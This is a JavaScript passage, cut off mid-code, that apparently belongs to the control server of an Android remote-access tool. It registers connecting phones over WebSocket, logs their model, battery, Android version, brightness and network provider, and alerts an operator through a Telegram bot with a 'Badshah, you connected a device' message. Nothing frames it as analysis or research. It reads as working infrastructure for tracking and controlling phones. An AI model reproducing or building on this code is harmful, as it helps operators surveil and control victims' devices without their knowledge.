/* ---------------- WEBSOCKET ---------------- */

function cleanStaleClients() {
    appClients.forEach((value, key) => {
        let found = false;
        appSocket.clients.forEach((ws) => { if (ws.uuid === key && ws.readyState === 1) found = true; });
        if (!found) appClients.delete(key);
    });
}

appSocket.on('connection', (ws, req) => {
    // Stable deviceId (client query me ?deviceId=... bheje, warna random)
    let deviceId = null;
    try {
        const u = new URL(req.url, "http://localhost");
        deviceId = u.searchParams.get("deviceId");
    } catch (e) {}

    const uuid = deviceId || uuid4.v4();
    const model = req.headers.model || "Unknown";
    const battery = req.headers.battery || "?";
    const version = req.headers.version || "?";
    const brightness = req.headers.brightness || "?";
    const provider = req.headers.provider || "?";

    ws.uuid = uuid;
    ws.isAlive = true;

    const isReconnect = appClients.has(uuid);

    // Purane same-uuid socket ko terminate karo (duplicate na rahe)
    appSocket.clients.forEach((client) => {
        if (client !== ws && client.uuid === uuid) {
            try { client.terminate(); } catch (e) {}
        }
    });

    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider,
        connectedAt: Date.now()
    });

    // Sirf tab message bhejo jab pehli baar connect ho (reconnect pe spam na ho)
    if (!isReconnect) {
        appBot.sendMessage(id,
            `°• 🤠Badshah aapne device connect kr liya🤠\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            { parse_mode: "HTML" }
        ).catch(() => {});
    }

    ws.on('pong', () => { ws.isAlive = true; });
    ws.on('message', () => { ws.isAlive = true; });
    ws.on('error', () => { ws.isAlive = false; });

    ws.on('close', function () {
        // Sirf tab delete karo jab ye waqai abhi bhi registered ho
        if (appClients.has(ws.uuid)) {
            appClients.delete(ws.uuid);
            appBot.sendMessage(id,
                `°• 😥𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙😥\n\n` +
                `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
                `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
                `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
                `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
                `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
